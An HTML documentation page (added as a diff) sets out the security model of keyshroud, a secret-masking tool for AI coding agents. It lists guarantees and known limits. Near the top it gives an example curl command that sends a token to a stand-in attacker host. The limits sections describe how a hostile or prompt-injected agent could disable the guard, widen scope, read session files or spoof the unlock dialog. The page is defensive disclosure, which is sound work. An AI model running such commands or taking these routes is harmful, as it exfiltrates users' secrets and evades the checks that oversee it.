@@ -1,0 +1,310 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Security model · keyshroud docs</title>
+<meta name="description" content="The guarantees we test for, and the known limits.">
+<meta property="og:title" content="Security model · keyshroud docs">
+<meta property="og:description" content="The guarantees we test for, and the known limits.">
+<meta property="og:url" content="https://keyshroud.dev/docs/security">
+<meta property="og:image" content="https://keyshroud.dev/og.png">
+<meta name="twitter:card" content="summary_large_image">
+<link rel="canonical" href="https://keyshroud.dev/docs/security">
+<link rel="alternate" type="text/markdown" href="/docs/security.md">
+<link rel="icon" href="/favicon.svg" type="image/svg+xml">
+<meta name="color-scheme" content="light dark">
+<link rel="stylesheet" href="/docs/docs.css">
+</head>
+<body>
+<header class="bar">
+  <div class="wrap">
+    <a class="brand" href="/">
+      <picture>
+        <source srcset="/logo-dark.svg" media="(prefers-color-scheme: dark)">
+        <img src="/logo.svg" alt="keyshroud">
+      </picture>
+    </a>
+    <nav>
+      <a href="/docs/" aria-current="true">Docs</a>
+      <a href="/#quickstart">Quickstart</a>
+      <a class="opt" href="/#demo">Demo</a>
+      <a class="opt" href="/#compare">Compare</a>
+      <a class="gh" href="https://github.com/dinhkarate/keyshroud">GitHub</a>
+    </nav>
+  </div>
+</header>
+<div class="wrap page">
+  <details class="menu">
+    <summary>All docs</summary>
+    <nav class="side" aria-label="Docs, short screen">
+<h4>Guides</h4>
+<ul>
+<li><a href="/docs/migrate-from-dotenv">Move a project off .env</a></li>
+<li><a href="/docs/ci-and-docker">CI and Docker</a></li>
+<li><a href="/docs/rotate-a-key">Rotate a key that leaked</a></li>
+<li><a href="/docs/troubleshooting">Troubleshooting</a></li>
+</ul>
+<h4>Where secrets live</h4>
+<ul>
+<li><a href="/docs/local-vault">The local vault</a></li>
+<li><a href="/docs/vaultwarden">Vaultwarden or Bitwarden</a></li>
+<li><a href="/docs/team-secret-managers">Team secret managers</a></li>
+<li><a href="/docs/project-scope">Project scope</a></li>
+</ul>
+<h4>Agents</h4>
+<ul>
+<li><a href="/docs/claude-code">Claude Code</a></li>
+<li><a href="/docs/agents">pi, omp and other agents</a></li>
+</ul>
+<h4>Reference</h4>
+<ul>
+<li><a href="/docs/cli">CLI reference</a></li>
+<li><a href="/docs/how-it-works">How it works</a></li>
+<li><a href="/docs/security" aria-current="page">Security model</a></li>
+<li><a href="/docs/faq">FAQ</a></li>
+</ul>
+    </nav>
+  </details>
+  <nav class="side wide" aria-label="Docs">
+<h4>Guides</h4>
+<ul>
+<li><a href="/docs/migrate-from-dotenv">Move a project off .env</a></li>
+<li><a href="/docs/ci-and-docker">CI and Docker</a></li>
+<li><a href="/docs/rotate-a-key">Rotate a key that leaked</a></li>
+<li><a href="/docs/troubleshooting">Troubleshooting</a></li>
+</ul>
+<h4>Where secrets live</h4>
+<ul>
+<li><a href="/docs/local-vault">The local vault</a></li>
+<li><a href="/docs/vaultwarden">Vaultwarden or Bitwarden</a></li>
+<li><a href="/docs/team-secret-managers">Team secret managers</a></li>
+<li><a href="/docs/project-scope">Project scope</a></li>
+</ul>
+<h4>Agents</h4>
+<ul>
+<li><a href="/docs/claude-code">Claude Code</a></li>
+<li><a href="/docs/agents">pi, omp and other agents</a></li>
+</ul>
+<h4>Reference</h4>
+<ul>
+<li><a href="/docs/cli">CLI reference</a></li>
+<li><a href="/docs/how-it-works">How it works</a></li>
+<li><a href="/docs/security" aria-current="page">Security model</a></li>
+<li><a href="/docs/faq">FAQ</a></li>
+</ul>
+  </nav>
+  <main>
+<article>
+<h1>Security model</h1>
+<p>keyshroud protects against <strong>accidental disclosure</strong>: secrets ending up in
+transcripts, provider logs, screenshots, commits, or the model&#39;s context because
+a command printed them.</p>
+<p>It does <strong>not</strong> make a hostile or prompt-injected agent safe. An agent that can
+run <code>keyshroud run -- curl https://evil.example -d &quot;$TOKEN&quot;</code>, or base64-encode a
+value before printing it, can exfiltrate it. If that is your threat model, use
+an egress proxy that swaps placeholder credentials on the wire (for example
+Infisical Agent Vault or OneCLI), restrict which secrets each session
+gets with <code>--only</code>, and keep a human approving commands.</p>
+<h2 id="the-local-vault"><a class="anchor" href="#the-local-vault">The local vault</a></h2>
+<p>The local vault is encrypted at rest (AES-256-GCM); its key is in your OS keychain (macOS
+keychain, Linux Secret Service, Windows DPAPI). Any program running as you can read that key, agents
+included, so in this mode keyshroud does not ask before opening the vault: the same exposure as storing
+a Vaultwarden master password in the keychain, and weaker than Vaultwarden&#39;s ask-every-30-minutes
+default. Create the vault with <code>KEYSHROUD_VAULT_KEY=passphrase</code> to be asked (sessions end after 30
+minutes).</p>
+<p>On a Mac, a <strong>Touch ID vault</strong> (<code>KEYSHROUD_VAULT_KEY=secure-enclave</code>, or <code>keyshroud rekey --to secure-enclave</code>) closes that gap while no session is open: its key is wrapped to a P-256 key held by
+the Mac&#39;s Secure Enclave, which answers only after the person at the Mac approves a Touch ID sheet (or
+types the Mac&#39;s password). For the session that follows (30 minutes), the key sits in <code>vault.session</code> +
+<code>vault.token</code> like a passphrase session, and any program running as you can read it; <code>keyshroud lock</code>
+or a shorter <code>KEYSHROUD_SESSION_TTL_MS</code> narrows that window. Touch ID proves someone is present, not
+what they meant to approve: a program already running as you can show its own sheet, or change
+keyshroud or its helper to capture the next approval. There is no recovery: the vault opens on that
+Mac only, so run <code>keyshroud backup</code> (or <code>rekey --to passphrase</code>) before erasing or moving it. A local
+vault belongs to one machine and has no recovery of its own: <code>keyshroud backup</code> is its backup, and
+Vaultwarden or Bitwarden the option for several machines. <code>vault.json</code> is safe to copy only as long as
+its key is not. A backup file holds every item under its passphrase alone: whoever has the file can
+guess at that passphrase offline (scrypt, N=2^17, slows each guess), so choose a long one and keep
+the file off the machines agents work on.</p>
+<h2 id="guarantees-we-test-for"><a class="anchor" href="#guarantees-we-test-for">Guarantees we test for</a></h2>
+<ul>
+<li>secret values never appear in argv, logs, keyshroud&#39;s own diagnostics, MCP results, hook
+output, or <code>audit.jsonl</code>; an error from <code>bw</code> is shown without anything keyshroud gave it;</li>
+<li>new secrets are read from a masked prompt, <code>--stdin</code>, or a native dialog, never flags;</li>
+<li>the dialog an agent can open says it was requested by a program, warns against the
+master password, refuses names that are not one printable line, refuses the master
+password itself, and opens one at a time (30 s pause after a cancel);</li>
+<li>the session file, local vault, redact index, rendered templates and auth files are <code>0600</code>;</li>
+<li>the local vault is replaced atomically (temporary file, fsync, rename) under a lock, changes to any
+part of it fail its integrity check (within the known limits below), and a vault that fails it is
+never overwritten;</li>
+<li>a local vault&#39;s passphrase is set only in a terminal and never stored; it and the Vaultwarden
+master password are refused as a secret, whichever vault the secret is going to; when a vault
+that is there cannot be asked (<code>bw</code> fails, the vault file cannot be read), nothing is stored;</li>
+<li>env.json, auth.json and hook index writes are locked and atomic, a writer that lost its lock writes
+nothing, and a wired name is never overwritten without <code>--force</code>. The lock is the directory pi
+and omp use themselves (<code>&lt;file&gt;.lock</code>, beside the file a link leads to, and beside the link too),
+so their writers wait for it and cannot break it (should keyshroud be killed while it holds one,
+pi reports the lock until the next keyshroud command clears it);</li>
+<li>commands started by <code>run</code> and <code>secrets_run</code> never receive <code>BW_SESSION</code>,
+<code>BW_PASSWORD</code>, <code>BW_CLIENTID</code>, <code>BW_CLIENTSECRET</code> or <code>KEYSHROUD_PASSPHRASE</code> (these names and
+<code>BITWARDENCLI_APPDATA_DIR</code> cannot be wired or set by an env file either), and with <code>--only</code> the
+other wired names are removed from what the command inherits, so <code>--only</code> really limits
+what a command can read (inside pi/omp the agent process keeps the session for
+legacy <code>!bw</code> auth entries; its value is redacted from tool output);</li>
+<li>two values that would get one label (<code>&lt;redacted:NAME&gt;</code>, <code>&lt;redacted:NAME (2)&gt;</code>) are both masked;</li>
+<li>env files may contain only references and literals: a <code>!command</code> value is
+rejected, and so are variables that change what programs load or run (<code>PATH</code>,
+<code>NODE_OPTIONS</code>, <code>LD_*</code>, <code>DYLD_*</code>, <code>BASH_ENV</code>, <code>GIT_SSH_COMMAND</code>, …), which are
+also never wired or injected (the list covers the common ones, not every tool&#39;s:
+an env file still configures the program it is used with);</li>
+<li>an unparseable <code>env.json</code> or <code>auth.json</code> is never overwritten;</li>
+<li>a <a href="/docs/team-secret-managers">source</a> is only
+read, at the address <code>source add</code> was given: a reference cannot name a server, the address must be
+https (http on localhost only; checked when it is set and again before every request), redirects are
+not followed, the certificate is checked whatever Node&#39;s environment says, and the token goes in a
+header, never a URL or argv. A vendor&#39;s CLI is started with a list of arguments, not a command line
+(on Windows a <code>.cmd</code> launcher such as <code>az.cmd</code> or <code>gcloud.cmd</code> runs through <code>cmd.exe</code>, with every
+argument escaped), without keyshroud&#39;s vault credentials in its environment, and no part of a
+reference can become one of its options. What a server or a vendor&#39;s CLI says when it fails is never
+passed on: an error names the reference, the HTTP status or the kind of failure, in keyshroud&#39;s
+own words (and, for a KV secret with several fields, the names of its fields). Source credentials, login tokens and the token in <code>~/.vault-token</code> are
+masked like any other value.</li>
+</ul>
+<h2 id="known-limits"><a class="anchor" href="#known-limits">Known limits</a></h2>
+<h3 id="the-vault-file"><a class="anchor" href="#the-vault-file">The vault file</a></h3>
+<ul>
+<li>The local vault&#39;s integrity check proves a file was sealed with its key, not that it is the latest
+one or who sealed it. A program that can write <code>vault.json</code> can put an older copy back, and can
+replace a Touch ID vault with a new one made for the same Secure Enclave key (the public half is in
+the file), which then opens on your next approval with its contents instead of yours; neither
+reveals what the vault held.</li>
+<li>The check that refuses a vault&#39;s own password as a secret asks <code>bw</code>: where no <code>bw</code> program is found,
+or all <code>bw</code> answers is that nobody is logged in, there is no vault on this machine to ask, and the
+value is stored; a <code>bw</code> that is there but does not start stops the save.</li>
+</ul>
+<h3 id="locks"><a class="anchor" href="#locks">Locks</a></h3>
+<ul>
+<li>The lock on pi&#39;s and omp&#39;s <code>auth.json</code> is their own (a directory, taken over after 30 s):
+keyshroud&#39;s writers are fenced against each other and pi cannot take over a lock keyshroud holds,
+but a lock that pi holds or left behind is only as safe as that scheme is between two pi processes.
+pi 1.5 locks beside the file a link leads to, pi 1.2 and older beside the path as it is written;
+keyshroud takes the first, and the second for the path it was itself given, and a write that waits
+there cannot land once either lock is gone. What that leaves out: an older pi that reaches
+<code>auth.json</code> through a different link than keyshroud does (they then share no lock at all), so point
+both at the same path.</li>
+<li>The locks around calls to <code>bw</code>, the unlock dialog and the local vault&#39;s session files are simpler:
+one is taken over when its holder shows no sign of life (30 s for the session files, 60 s for <code>bw</code>,
+whose holder renews it while it works; a dialog counts as open for 5 minutes and 30 s, the time it
+may stay on screen), so a holder that was only stalled can overlap with the next one. That can mean
+a second dialog, a <code>bw</code> call that fails, or a session you have to open again; it does not put a
+value anywhere.</li>
+<li>Claude Code&#39;s <code>settings.json</code> has no lock of its own: <code>claude-setup</code> is safe against another
+<code>claude-setup</code> (a stalled one replaces nothing and widens no file but the one it wrote), not against
+Claude Code writing the file at the same moment.</li>
+</ul>
+<h3 id="references-and-env-files"><a class="anchor" href="#references-and-env-files">References and env files</a></h3>
+<ul>
+<li>A <code>.env.refs</code> can reference <strong>any</strong> item in your vault, not only the ones you wired, and any secret
+your sign-in to a source may read (keep a Vault token&#39;s policy, or the machine identity&#39;s access, as
+narrow as the work needs), so read a cloned repo&#39;s <code>.env.refs</code> before running <code>--env-file</code> with it.</li>
+<li><code>import</code> decides what is secret by heuristics and keeps everything else as a literal; check its plan
+before committing <code>.env.refs</code>.</li>
+</ul>
+<h3 id="the-claude-code-hook-and-the-guard"><a class="anchor" href="#the-claude-code-hook-and-the-guard">The Claude Code hook and the guard</a></h3>
+<ul>
+<li>The <code>PostToolUse</code> hook does not see failed commands (<code>PostToolUseFailure</code> cannot rewrite output;
+<code>keyshroud claude-guard</code> masks those for the Bash tool, on macOS and Linux, once you turn it on) or
+anything a client sends as telemetry.</li>
+<li>It masks nothing until an index exists (written at session start, and added to by <code>run</code>,
+<code>secrets_run</code>, <code>get</code>, <code>inject</code>, <code>api-key</code>, <code>add</code>, <code>rotate</code> and <code>wire</code>; a hook that fails lets the
+output through as it is; the guard reads the same index, and does not run the command when it cannot
+start).</li>
+<li>It only knows wired values, keys written into <code>auth.json</code> as plain text, and values keyshroud itself
+printed (<code>get</code>, <code>inject</code>, <code>api-key</code>), so a failed <code>keyshroud get bw://…</code> or <code>run --no-mask</code> still
+shows in the clear. Run secret-using commands through <code>keyshroud run</code> or <code>secrets_run</code>, with <code>--only</code>
+(or <code>only</code>) naming the secrets the command needs, since every wired secret (every one in the
+<a href="/docs/project-scope">project&#39;s scope</a>, where there is one) is injected otherwise.</li>
+<li>A project&#39;s scope is a default, not a wall: it is a file in the repo, so whoever can write there (the
+agent included) can widen or remove it, a reference names any item whatever the scope says, and a
+command run from another directory is not under it.</li>
+<li>The guard is a setting of Claude Code and a launcher file, both writable by a program running as
+you: an agent that means to can turn it off, as it can skip <code>keyshroud run</code>; both guard against
+accidents, not against that.</li>
+</ul>
+<h3 id="an-agent-with-shell-access-as-your-user"><a class="anchor" href="#an-agent-with-shell-access-as-your-user">An agent with shell access as your user</a></h3>
+<ul>
+<li>It can open a keychain-mode local vault at any time, and use a passphrase vault&#39;s session files
+until the session ends.</li>
+<li>It can also read <code>~/.config/keyshroud/session</code> and use <code>bw</code> directly until that session ends — after
+<code>setup</code> that reaches only the agent account; a stored master password (keychain entry or
+<code>~/.config/keyshroud/master-password</code>) it can read at any time, which is why keyshroud asks instead
+by default; otherwise run agents in a sandbox or container if that matters.</li>
+<li>The same agent could also draw a window that looks like the unlock dialog; when in doubt, cancel it
+and run <code>keyshroud unlock</code> in a terminal.</li>
+<li>Without <code>setup</code>, keyshroud shares bw&#39;s default login, so the 30-minute lock also ends a <code>bw</code> session
+you opened yourself.</li>
+</ul>
+<h3 id="what-redaction-matches"><a class="anchor" href="#what-redaction-matches">What redaction matches</a></h3>
+<ul>
+<li>Redaction is exact-match, so a <em>partial</em> or transformed value (<code>${TOKEN:0:10}</code>, base64, a line
+wrapped by a tool) is not masked.</li>
+<li>Two reshaped forms are: a value is also masked without its leading and trailing spaces or line
+breaks, and a value of several lines or a JSON document (a PEM key, a service account file) is also
+masked run by run (20 or more letters, digits and <code>+/=_-</code>), so a key shown with line numbers or as a
+diff stays masked.</li>
+<li>Values shorter than 6 characters are not redacted (to avoid noise), so don&#39;t wire short PINs.</li>
+<li>Of the keys written into <code>auth.json</code> as plain text, one that is nothing but the name of a variable
+(<code>OPENAI_API_KEY</code>, <code>$OPENAI_API_KEY</code>) stands for that variable when it is set: its value is masked,
+the name is not (masking it would change every file that mentions the variable). A key with
+variables in it is masked as text and filled in as pi does, from the entry&#39;s own <code>env</code> first; the
+values in that <code>env</code> are not masked by themselves.</li>
+<li>A <code>!command</code> there that is not a keyshroud reference is another program&#39;s: keyshroud does not run it
+to learn what it prints, so its output is masked only when the entry has a variable&#39;s name and is
+injected.</li>
+<li>pi&#39;s <code>/secret</code>, <code>/vault_add</code> and <code>/vault_rotate</code> popups store a pasted value without the spaces or
+line breaks around it; for a value where those matter, use <code>keyshroud add --stdin</code>, which keeps
+everything but one line break at the very end (end the input with two if the value ends with one).</li>
+</ul>
+<h3 id="sources"><a class="anchor" href="#sources">Sources</a></h3>
+<ul>
+<li><code>sources.json</code> is a plain file, so a program running as you can point the Vault source at another
+https server, which then receives the token on the next read; the same program could read
+<code>~/.vault-token</code> itself.</li>
+<li>A token of <code>vault login</code> is used as it is: keyshroud does not renew it, and when it ends the
+references are unresolved until you log in again.</li>
+<li>A secret read from a source is masked from the moment keyshroud reads it, not before. Wired names
+are read at session start and whenever the hook&#39;s index is refreshed (<code>add</code>, <code>rotate</code>, <code>wire</code>,
+<code>source add</code>), source references among them: a wired <code>op://</code> reference can bring up 1Password&#39;s own
+prompt then, so a reference only one project needs belongs in its <code>.env.refs</code>. A reference that sits
+in a wiring file and that no command injects is not read from a source just to mask it.</li>
+<li>When the server is away, each request waits up to 10 seconds (a first read with AppRole makes three;
+a vendor&#39;s CLI gets 30) and the names are unresolved.</li>
+<li>Why a source refused is told only by kind (an HTTP status; for a vendor&#39;s CLI: not signed in,
+refused access, not found, or just &quot;failed&quot;), guessed from the CLI&#39;s message, so the kind can be
+wrong; the message itself is in your terminal when you run that CLI.</li>
+<li>keyshroud&#39;s Vault and Infisical code is tested against real servers; the <code>op</code>, <code>gcloud</code> and <code>az</code>
+paths only against stand-in CLIs.</li>
+</ul>
+<p>Report vulnerabilities privately — see <a href="https://github.com/dinhkarate/keyshroud/blob/main/SECURITY.md">SECURITY.md</a>.</p>
+</article>
+<p class="edit"><a href="https://github.com/dinhkarate/keyshroud/blob/main/docs/security.md">Edit this page on GitHub</a> · <a href="/docs/security.md">Markdown</a></p>
+<div class="steps"><a class="prev" rel="prev" href="/docs/how-it-works"><span>Previous</span>How it works</a><a class="next" rel="next" href="/docs/faq"><span>Next</span>FAQ</a></div>
+  </main>
+  <nav class="toc" aria-label="On this page">
+<h4>On this page</h4>
+<ul>
+<li><a href="#the-local-vault">The local vault</a></li>
+<li><a href="#guarantees-we-test-for">Guarantees we test for</a></li>
+<li><a href="#known-limits">Known limits</a></li>
+</ul>
+  </nav>
+</div>
+<footer>
+  <div class="wrap">
+    <p>keyshroud · MIT · <a href="https://github.com/dinhkarate/keyshroud">GitHub</a> · <a href="https://www.npmjs.com/package/keyshroud">npm</a> · <a href="/llms.txt">llms.txt</a> · Not affiliated with Anthropic, Bitwarden, Inc. or any vendor named here.</p>
+  </div>
+</footer>
+<script src="/docs/docs.js" defer></script>
+</body>
+</html>
